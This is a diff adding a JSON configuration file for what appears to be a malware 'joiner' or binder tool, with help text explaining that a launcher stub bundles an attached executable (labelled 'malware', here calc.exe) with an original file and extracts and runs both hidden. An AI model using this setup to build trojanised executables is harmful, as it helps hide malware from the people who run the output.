@@ -1,0 +1,20 @@
+{
+	 "joiner"		: "./joiner.py",
+     "launcher"     : "./Launcher.exe",
+     "output"       : "./output.exe",
+
+     "malware"      : "./calc.exe",
+     "path_malware" : ".\\mal.dll",
+
+     "path_original": ".\\debug.dll",
+
+
+     "HELP": {
+        "path_original"     : "Remote path and filename where the original file will be extracted and executed (the file will be hidden)", 
+        "malware"           : "Remote path to the attached executable (malware)", 
+        "HELP"              : "This help ", 
+        "launcher"          : "Local path to the launcher (stub)", 
+        "path_malware"      : "Remote path and filename where the attached executable will be extracted and executed (the file will be hidden)", 
+        "output"            : "Local path to the generated executable (launcher + malware + original executable)"
+    }
+}
